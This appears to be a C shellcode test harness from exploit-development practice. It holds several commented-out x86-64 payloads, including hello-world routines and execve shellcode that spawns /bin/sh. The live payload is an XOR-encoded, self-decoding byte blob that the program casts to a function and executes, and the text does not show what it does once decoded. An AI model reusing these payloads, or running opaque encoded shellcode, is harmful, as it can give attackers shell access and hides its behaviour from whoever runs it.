#include <stdio.h>
#include <string.h>

//char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
//char code[] = "\xeb\x0c\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a\xb0\x01\x40\xb7\x01\x48\x8d\x35\xe8\xff\xff\xb2\x0c\x0f\x05\xb0\x3c\x40\xb7\x01\x0f\x05";
//char code[] = "\xeb\x0c\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x8d\x35\xe4\xff\xff\xff\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05"; //simple hellow

//char code[] = "\xeb\x1f\x5e\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdc\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a";//simple jmp call hello
//char code[] = \
"\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";//simple stack

//char code [] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
unsigned char code[] = 
"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x65\x12\xdc\xa9\xe7\xdd\x18\x45\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x0f\x3b\x84\x30\x8d\xdf"
"\x47\x2f\x64\x4c\xd3\xac\xaf\x4a\x4a\x82\x61\x36\xde\xa9\xf6"
"\x81\x50\xcc\x83\x78\xcc\xf3\x8d\xec\x40\x4a\x60\x78\xee\xf1"
"\xe8\xd8\x50\x74\x93\x78\xf7\xf1\xe8\xd8\x50\xd2\x0f\x11\x82"
"\xe1\x18\x13\x72\x64\x3d\x1d\xd9\xdc\x11\xb7\x23\x1d\xfc\x5a"
"\x67\x86\x85\xb4\x76\x6a\x16\x7a\xdc\xfa\xaf\x54\xff\x17\x32"
"\x5a\x55\x4f\xe8\xd8\x18\x45";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}



